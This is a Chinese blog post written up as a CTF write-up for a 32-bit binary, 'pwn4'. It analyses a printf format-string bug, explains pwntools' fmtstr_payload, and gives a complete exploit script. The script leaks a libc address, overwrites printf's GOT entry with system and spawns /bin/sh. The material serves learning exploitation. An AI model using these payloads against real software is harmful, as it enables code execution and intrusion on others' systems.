@@ -1,0 +1,183 @@
+---
+layout:     post
+title:      "fmtstr利用之pwn4"
+subtitle:   "记一简单格式化字符串利用过程"
+date:       2018-09-01 12:00:00
+author:     "Chris"
+catalog: true
+tags:
+    - Pwn
+    - 笔记
+ 
+---
+
+
+# 0x00 代码分析
+
+1，检查保护
+
+	[*] '/home/chris/Pwn/pwn4'
+	    Arch:     i386-32-little
+	    RELRO:    Partial RELRO
+	    Stack:    No canary found
+	    NX:       NX enabled
+	    PIE:      No PIE (0x8048000)
+ 只开了NX
+
+2，使用IDA分析程序流程
+
+main 函数分析
+
+	int __cdecl main(int argc, const char **argv, const char **envp)
+	{
+	  char buf; // [esp+0h] [ebp-88h]
+	
+	  puts("please login first");
+	  fflush(stdout);
+	  login();
+	  if ( login_flag )
+	  {
+	    printf("welcome~%s,the present for first meet~%p\n", &name, &buf);
+	    puts("do you have something say to me~");
+	    fflush(stdout);
+	    if ( read(0, &buf, 0x80u) < 0 )
+	    {
+	      puts("read error");
+	      exit(0);
+	    }
+	    printf(&buf);
+	  }
+	  else
+	  {
+	    puts("please login first!");
+	    login();
+	  }
+	  return 0;
+	}
+
+
+login 函数分析
+
+	int login()
+	{
+	  puts("your name:");
+	  fflush(stdout);
+	  if ( read(0, &name, 0x20u) < 0 )
+	  {
+	    puts("read error");
+	    exit(0);
+	  }
+	  login_flag = 1;
+	  return puts("logined!");
+	}
+
+程序定义了一个buf[88]的数组，首先让输入你的名字，然后再打印出刚才输入的名字和buf的栈地址，然后再让你输入一个字符串，打印出这个字符串。
+
+
+## 0x01 漏洞分析
+
+首先分析输入name的地方，name的地址在bss段，不在栈中无法溢出。输入buf的地方，buf虽然在栈中，大小为`ebp-88h`，但是输入的地方`read(0, &buf, 0x80u)`，长度不能够溢出。明显`printf(&buf);`存在格式化字符串漏洞。
+
+
+## 0X02 漏洞利用与fmtstr_payload介绍
+
+很明显的格式化字符串漏洞了，执行一个任意地址泄露和任意地址写（泄露printf函数的plt.got表内地址，往main函数ret地址写一个main函数地址，回去二次执行程序流程）。因为前面泄露了地址，程序提供了libc库，算出system函数实际地址，第二次就往printf函数的plt.got表写入system函数地址，同时改写返回地址再次执行程序流程。最后printf（&system("/bin/sh")）拿到shell。
+
+这里介绍一个pwntools自带的格式化字符串任意地址写的函数：**fmtstr_payload**
+
+`fmtstr_payload（offset，writes，numbwritten = 0，write_size ='byte' ）`
+
+使用给定参数创建有效负载。它可以为32位或64位架构生成有效负载。addr的大小取自`context.bits`
+
+参数：
+
+* offset（int） - 您控制的第一个格式化程序的偏移量
+* 写（dict） - dict with addr，value{addr: value, addr2: value2}
+* numbwritten（int） - printf函数已写入的字节数
+* write_size（str） - 必须是byte，short或int。告诉您是否要逐字节写入，短按short或int（hhn，hn或n）
+
+例子：
+
+	>>> context.clear(arch = 'amd64')
+	>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
+	'\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00%322419374c%1$n%3972547906c%2$n'
+	>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
+	'\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00%47774c%1$hn%22649c%2$hn%60617c%3$hn%4$hn'
+	>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
+	'\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00%126c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn%237c%5$hhn%6$hhn%7$hhn%8$hhn'
+	>>> context.clear(arch = 'i386')
+	>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
+	'\x00\x00\x00\x00%322419386c%1$n'
+	>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
+	'\x00\x00\x00\x00\x02\x00\x00\x00%47798c%1$hn%22649c%2$hn'
+	>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
+	'\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00%174c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn'
+
+
+## 0X03 完整利用过程
+
+* 构造`p32(put_got)+"%4$s"`，同时这里还要往返回地址写一个main函数地址。找到`&buf+9c`偏移为ret地址，继续构造`fmtstr_payload(6,{ret:main},12)`，参数6为4偏移加上泄露字符串的长度2DWORD,参数12为%s泄露出的地址和额外数据长度+4，因为%s以`'\0'`结尾,不同libc库环境可能这个参数数值不同，可自行根据判断调整。
+* 成功泄露地址后算出system函数地址，第二次执行流程利用，同理`fmtstr_payload(4,{printf_got:system,ret+4:main},0,'short')+";/bin/sh;#"`往ret+4写是因为，第二次执行main函数后ret地址往后挪了一位。然后往printf函数的plt.got表写入system函数地址，同时改写返回地址再次执行程序流程。不同的是这里的payload最后要写入个`;/bin/sh;#`因为第三次执行流程的`printf(&buf)`buf地址为第二次的buf地址偏一点点，用了参数截断，执行/bin/sh。
+
+
+
+
+## 0x04 脚本
+
+	from pwn import *
+	context.log_level="debug"
+	context.arch="i386"
+	p = process("./pwn4")
+	
+	p.recvuntil("name:")
+	p.sendline("A"*0x10)
+	p.recvuntil("meet~")
+	
+	stack = int(p.recvuntil("\n",drop=True),16)
+	
+	print hex(stack)
+	ret = stack + 0x9c
+	print hex(ret)
+	put_got = 0x804A018
+	pay = p32(put_got)+"%4$s"
+	
+	pay2 = fmtstr_payload(6,{ret:0x804856E},12)
+	pay = pay + pay2
+	p.recvuntil("g say to me~")
+	
+	p.sendline(pay)
+	print p.recvuntil("\x18\xa0\x04\x08")
+	puts = u32(p.recv(4))
+	
+	libc = ELF("/lib/i386-linux-gnu/libc-2.19.so")
+	
+	system = puts - libc.symbols['puts'] + libc.symbols['system']
+	
+	sleep(2)
+	p.send("A"*0x20)
+	
+	print hex(system)
+	
+	pay = fmtstr_payload(4,{0x804a010:system,ret+4:0x0804856e},0,'short')+";/bin/sh;#"
+	
+	p.send(pay)
+	
+	sleep(2)
+	p.recvuntil("#")
+	sleep(1)
+	p.sendline("BBBBBB")
+	
+	p.interactive()
+
+## 0x05 总结
+
+其实这道题有个很简单的解法，直接往返回地址写rop，泄露地址，执行system，全部rop就搞定了
+
+大致就这样 :
+
+`exp1=fmtstr_payload(4,{ret:put_plt,ret+4:main,ret+8:put_got},0,'short')`
+
+`exp2=fmtstr_payload(4,{ret:system_addr,ret+4:任意,ret+8:name_addr('/bin/sh')},0,'short')`
+
+>[文件下载](https://github.com/yxshyj/project/tree/master/pwn/fmtstr%E5%88%A9%E7%94%A8%E4%B9%8Bpwn4)
+
